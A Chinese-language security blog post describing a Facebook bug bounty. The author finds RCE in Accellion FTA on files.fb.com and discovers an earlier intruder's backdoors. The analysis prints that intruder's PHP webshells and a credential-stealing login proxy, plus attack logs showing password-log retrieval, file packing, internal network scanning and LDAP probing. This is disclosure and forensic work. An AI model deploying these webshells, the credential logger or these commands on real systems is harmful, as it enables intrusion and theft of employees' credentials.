---
layout: post
title: "滲透 Facebook 的思路與發現"
description: "從滲透的角度看待 Bug Bounty，從如何定位出目標到找出 Facebook 遠端代碼執行漏洞，並在過程中發現其他駭客的足跡..."
category: "案例剖析"
tags: ["Facebook", "BugBounty", "RCE", "Backdoor", "Reconnaissance", "Pentest"]
author: "orange"
keywords: "Facebook, BugBounty, RCE, Backdoor, Reconnaissance, Pentest"
og_image: "http://devco.re/images/news/20160421/facebook.jpg"
---

by [Orange Tsai](http://blog.orange.tw/)  

[How I Hacked Facebook, and Found Someone's Backdoor Script](http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/) (English Version)  
[滲透 Facebook 的思路與發現](http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/) (中文版本)  

----------

![Facebook](/images/news/20160421/facebook.jpg)

----------

### 寫在故事之前


身為一位滲透測試人員，比起 Client Side 的弱點我更喜歡 Server Side 的攻擊，能夠直接的控制伺服器、獲得權限操作 SHELL 才爽 <(￣︶￣)>   

當然一次完美的滲透任何形式的弱點都不可小覷，在實際滲透時偶爾還是需要些 Client Side 弱點組合可以更完美的控制伺服器，但是在尋找弱點時我本身還是先偏向以可直接進入伺服器的方式來去尋找風險高、能長驅直入的弱點。  

隨著 Facebook 在世界上越來越火紅、用戶量越來越多，一直以來都有想要嘗試看看的想法，恰巧 Facebook 在 2012 年開始有了 [Bug Bounty](https://www.facebook.com/whitehat/) 獎金獵人的機制讓我更躍躍欲試。

READMORE

一般如由滲透的角度來說習慣性都會從收集資料、偵查開始，首先界定出目標在網路上的 "範圍" 有多大，姑且可以評估一下從何處比較有機會下手。例如:  

* Google Hacking 到什麼資料?  
* 用了幾個 B 段的 IP ? C 段的 IP ?  
* Whois? Reverse Whois?
* 用了什麼域名? 內部使用的域名? 接著做子域名的猜測、掃描  
* 公司平常愛用什麼樣技術、設備?  
* 在 Github, Pastebin 上是否有洩漏什麼資訊?  
* ...etc  


當然 Bug Bounty 並不是讓你無限制的攻擊，將所蒐集到的範圍與 Bug Bounty 所允許的範圍做交集後才是你真正可以去嘗試的目標。

一般來說大公司在滲透中比較容易出現的問題點這裡舉幾個例子來探討  

 1. 對多數大公司而言，"**網路邊界**" 是比較難顧及、容易出現問題的一塊，當公司規模越大，同時擁有數千、數萬台機器在線，網管很難顧及到每台機器。在攻防裡，防守要防的是一個面，但攻擊只需找個一個點就可以突破，所以防守方相對處於弱勢，攻擊者只要找到一台位於網路邊界的機器入侵進去就可以開始在內網進行滲透了!
 2. 對於 "**連網設備**" 的安全意識相對薄弱，由於連網設備通常不會提供 SHELL 給管理員做進一步的操作，只能由設備本身所提供的介面設定，所以通常對於設備的防禦都是從網路層來抵擋，但如遇到設備本身的 0-Day 或者是 1-Day 可能連被入侵了都不自覺。
 3. 人的安全，隨著 "**社工庫**" 的崛起，有時可以讓一次滲透的流程變得異常簡單，從公開資料找出公司員工列表，再從社工庫找到可以登入 VPN 的員工密碼就可以開始進行內網滲透，尤其當社工庫數量越來越多 "**量變成質變**" 時只要關鍵人物的密碼在社工庫中可找到，那企業的安全性就全然突破 :P
<br>

理所當然在尋找 Facebook 弱點時會以平常進行滲透的思路進行，在開始搜集資料時除了針對 Facebook 本身域名查詢外也對註冊信箱進行 Reverse Whois 意外發現了個奇妙的域名名稱
    
    tfbnw.net

TFBNW 似乎是 "**TheFacebook Network**" 的縮寫  
再藉由公開資料發現存在下面這台這台伺服器  

    vpn.tfbnw.net

哇! vpn.tfbnw.net 看起來是個 Juniper SSL VPN 的登入介面，不過版本滿新的沒有直接可利用的弱點，不過這也成為了進入後面故事的開端。  

TFBNW 看似是 Facebook 內部用的域名，來掃掃 vpn.tfbnw.net 同網段看會有什麼發現  

* Mail Server Outlook Web App
* F5 BIGIP SSL VPN
* CISCO ASA SSL VPN
* Oracle E-Business
* MobileIron MDM

從這幾台機器大致可以判斷這個網段對於 Facebook 來說應該是相對重要的網段，之後一切的故事就從這裡開始。

----------

### 弱點發現

在同網段中，發現一台特別的伺服器

    files.fb.com


![files.fb.com](/images/news/20160421/1.jpg)
*↑ files.fb.com 登入介面*

<br>

從 LOGO 以及 Footer 判斷應該是 Accellion 的 Secure File Transfer (以下簡稱 FTA)

FTA 為一款標榜安全檔案傳輸的產品，可讓使用者線上分享、同步檔案，並整合 AD, LDAP, Kerberos 等 Single Sign-on 機制，Enterprise 版本更支援 SSL VPN 服務。

首先看到 FTA 的第一件事是去網路上搜尋是否有公開的 Exploit 可以利用，Exploit 最近的是由 HD Moore 發現並發佈在 Rapid7 的這篇 Advisory

* [Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)](https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857) 

弱點中可直接從 "**/tws/getStatus**" 中洩漏的版本資訊判斷是否可利用，在發現 files.fb.com 時版本已從有漏洞的 0.18 升級至 0.20 了，不過就從 Advisory 中所透露的片段程式碼感覺 FTA 的撰寫風格如果再繼續挖掘可能還是會有問題存在的，所以這時的策略便開始往尋找 FTA 產品的 0-Day 前進!

不過從實際黑箱的方式其實找不出什麼問題點只好想辦法將方向轉為白箱測試，透過各種方式拿到舊版的 FTA 原始碼後終於可以開始研究了!

整個 FTA 產品大致架構  

1. 網頁端介面主要由 Perl 以及 PHP 構成
2. PHP 原始碼皆經過 IonCube 加密
3. 在背景跑了許多 Perl 的 Daemon

首先是解密 IonCude 的部分，許多設備為了防止自己的產品被檢視所以會將原始碼加密，不過好在 FTA 上的 IonCude 版本沒到最新，可以使用現成的工具解密，不過由於 PHP 版本的問題，細節部份以及數值運算等可能要靠自己修復一下，不然有點難看...

經過簡單的原始碼審查後發現，好找的弱點應該都被 Rapid7 找走了 T^T  
而需要認證才能觸發的漏洞又不怎麼好用，只好認真點往深層一點的地方挖掘!  

經過幾天的認真挖掘，最後總共發現了七個弱點，其中包含了  

* Cross-Site Scripting x 3
* Pre-Auth SQL Injection leads to Remote Code Execution
* Known-Secret-Key leads to Remote Code Execution
* Local Privilege Escalation x 2

除了回報 Facebook 安全團隊外，其餘的弱點也製作成 Advisory 提交 Accellion 技術窗口，經過廠商修補提交 CERT/CC 後取得四個 CVE 編號

* CVE-2016-2350
* CVE-2016-2351
* CVE-2016-2352
* CVE-2016-2353

詳細的弱點細節會待 Full Disclosure Policy 後公布!

![shell on facebook](/images/news/20160421/2.jpg)
*↑ 使用 Pre-Auth SQL Injection 寫入 Webshell*

<br>


在實際滲透中進去伺服器後的第一件事情就是檢視當前的環境是否對自己友善，為了要讓自己可以在伺服器上待的久就要盡可能的了解伺服器上有何限制、紀錄，避開可能會被發現的風險 :P  

Facebook 大致有以下限制:  

 1. 防火牆無法連外, TCP, UDP, 53, 80, 443 皆無法
 2. 存在遠端的 Syslog 伺服器
 3. 開啟 Auditd 記錄

無法外連看起來有點麻煩，但是 ICMP Tunnel 看似是可行的，但這只是一個 Bug Bounty Program 其實不需要太麻煩就純粹以 Webshell 操作即可。  

----------

### 似乎有點奇怪?

正當收集證據準備回報 Facebook 安全團隊時，從網頁日誌中似乎看到一些奇怪的痕跡。  

首先是在 "**/var/opt/apache/php\_error\_log**" 中看到一些奇怪的 PHP 錯誤訊息，從錯誤訊息來看似乎像是邊改 Code 邊執行所產生的錯誤?  

![PHP error log](/images/news/20160421/3.jpg)
*↑ PHP error log*

<br>
跟隨錯誤訊息的路徑去看發現疑似前人留下的 Webshell 後門  

![Webshell on facebook server](/images/news/20160421/4.jpg)
*↑ Webshell on facebook server*

<br>

其中幾個檔案的內容如下

**sshpass**  
<pre><code>沒錯，就是那個 <a href='http://linux.die.net/man/1/sshpass'>sshpass</a></code></pre>
**bN3d10Aw.php**
{% highlight php %}
<?php echo shell_exec($_GET['c']); ?>
{% endhighlight %}

**uploader.php**
{% highlight php %}
<?php move_uploaded_file($_FILES["f]["tmp_name"], basename($_FILES["f"]["name"])); ?>
{% endhighlight %}

**d.php**
{% highlight php %}
<?php include_oncce("/home/seos/courier/remote.inc"); echo decrypt($_GET["c"]); ?>
{% endhighlight %}

**sclient\_user\_class\_standard.inc**
{% highlight php %}
<?php
include_once('sclient_user_class_standard.inc.orig');
$fp = fopen("/home/seos/courier/B3dKe9sQaa0L.log", "a"); 
$retries = 0;
$max_retries = 100; 

// 省略...

fwrite($fp, date("Y-m-d H:i:s T") . ";" . $_SERVER["REMOTE_ADDR"] . ";" . $_SERVER["HTTP_USER_AGENT"] . ";POST=" . http_build_query($_POST) . ";GET=" . http_build_query($_GET) . ";COOKIE=" . http_build_query($_COOKIE) . "\n"); 

// 省略...
{% endhighlight %}

前幾個就是很標準的 PHP 一句話木馬  
其中比較特別的是 "**sclient\_user\_class\_standard.inc**" 這個檔案  

include_once 中 "**sclient\_user\_class\_standard.inc.orig**" 為原本對密碼進行驗證的 PHP 程式，駭客做了一個 Proxy 在中間並在進行一些重要操作時先把 GET, POST, COOKIE 的值記錄起來  

整理一下，駭客做了一個 Proxy 在密碼驗證的地方，並且記錄 Facebook 員工的帳號密碼，並且將記錄到的密碼放置在 Web 目錄下，駭客每隔一段時間使用   wget 抓取

    wget https://files.fb.com/courier/B3dKe9sQaa0L.log


![logged password](/images/news/20160421/5.jpg)
*↑ Logged passwords*

<br>

從紀錄裡面可以看到除了使用者帳號密碼外，還有從 FTA 要求檔案時的信件內容，記錄到的帳號密碼會定時 Rotate (後文會提及，這點還滿機車的XD)  

發現當下，最近一次的 Rotate 從 2/1 記錄到 2/7 共約 300 筆帳號密碼紀錄，大多都是 "**@fb.com**" 或是 "**@facebook.com**" 的員工帳密，看到當下覺得事情有點嚴重了，在 FTA 中，使用者的登入主要有兩種模式  

 1. 一般用戶註冊，密碼 Hash 存在資料庫，由 SHA256 + SALT 儲存
 2. Facebook 員工 (@fb.com) 則走統一認證，使用 LDAP 由 AD 認證
 
在這裡相信記錄到的是真實的員工帳號密碼，****猜測**** 這份帳號密碼應該可以通行 Facebook Mail OWA, VPN 等服務做更進一步的滲透...  

此外，這名 "駭客" 可能習慣不太好 :P   

 1. 後門參數皆使用 GET 來傳遞，在網頁日誌可以很明顯的發現他的足跡
 2. 駭客在進行一些指令操作時沒顧慮到 STDERR ，導致網頁日誌中很多指令的錯誤訊息，從中可以觀察駭客做了哪些操作

<br>
從 access.log 可以觀察到的每隔數日駭客會將記錄到的帳號密碼清空  
{% highlight prolog %}
192.168.54.13 - - 17955 [Sat, 23 Jan 2016 19:04:10 +0000 | 1453575850] "GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p '********' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo > /home/seos/courier/B3dKe9sQaa0L.log' 2>/dev/stdout HTTP/1.1" 200 2559 ...
{% endhighlight %}
<br>

打包檔案
{% highlight bash %}
cat tmp_list3_2 | while read line; do cp /home/filex2/1000/$line files; done 2>/dev/stdout
tar -czvf files.tar.gz files
{% endhighlight %}
<br>

對內部網路結構進行探測
{% highlight tex %}
dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview_facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p '********' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'for i in $(seq 201 1 255); do for j in $(seq 0 1 255); do echo "192.168.$i.$j:`dig +short ptr $j.$i.168.192.in-addr.arpa`"; done; done' 2>/dev/stdout
...
{% endhighlight %}
<br>

使用 Shell Script 進行內網掃描但忘記把 STDERR 導掉XD

![Port Scanning](/images/news/20160421/6.jpg)
<br>

嘗試對內部 LDAP 進行連接
{% highlight tex %}
sh: -c: line 0: syntax error near unexpected token `('
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w '********' -s base (objectclass=*) 2>/dev/stdout'
{% endhighlight %}
<br>

嘗試訪問內部網路資源  
( 看起來 Mail OWA 可以直接訪問 ...)  
{% highlight text %}
--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT'

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-' saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.
{% endhighlight %}
<br>

嘗試對 SSL Private Key 下手  
{% highlight text %}
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input
{% endhighlight %}
<br>

從瀏覽器觀察 files.fb.com 的憑證還是 Wildcard 的 *.fb.com ...  

![certificate of files.fb.com](/images/news/20160421/7.jpg)

<br>

----------


### 後記

在收集完足夠證據後便立即回報給 Facebook 安全團隊，回報內容除了漏洞細節外，還附上相對應的 Log 、截圖以及時間紀錄xD  

從伺服器中的日誌可以發現有兩個時間點是明顯駭客在操作系統的時間，一個是七月初、另個是九月中旬  

七月初的動作從紀錄中來看起來比較偏向 "逛" 伺服器，但九月中旬的操作就比較惡意了，除了逛街外，還放置了密碼 Logger 等，至於兩個時間點的 "駭客" 是不是同一個人就不得而知了 :P  
而七月發生的時機點正好接近 CVE-2015-2857 Exploit 公佈前，究竟是透過 1-Day 還是無 0-Day 入侵系統也無從得知了。  

<br>

這件事情就記錄到這裡，總體來說這是一個非常有趣的經歷xD  
也讓我有這個機會可以來寫寫關於滲透的一些文章 :P  

最後也感謝 Bug Bounty 及胸襟寬闊的 Facebook 安全團隊 讓我可以完整記錄這起事件 : )  


----------


## Timeline

* 2016/02/05 20:05 提供漏洞詳情給 Facebook 安全團隊
* 2016/02/05 20:08 收到機器人自動回覆
* 2016/02/06 05:21 提供弱點 Advisory 給 Accellion 技術窗口
* 2016/02/06 07:42 收到 Thomas 的回覆，告知調查中
* 2016/02/13 07:43 收到 Reginaldo 的回覆，告知 Bug Bounty 獎金 $10000 USD
* 2016/02/13 詢問是否撰寫 Blog 是否有任何要注意的地方?
* 2016/02/13 詢問此漏洞被認為是 RCE 還是 SQL Injection
* 2016/02/18 收到 Reginaldo 的回覆，告知正在進行調查中，希望 Blog 先暫時不要發出
* 2016/02/24 收到 Hai 的回覆，告知獎金將會於三月發送
* 2016/04/20 收到 Reginaldo 的回覆，告知調查已完成


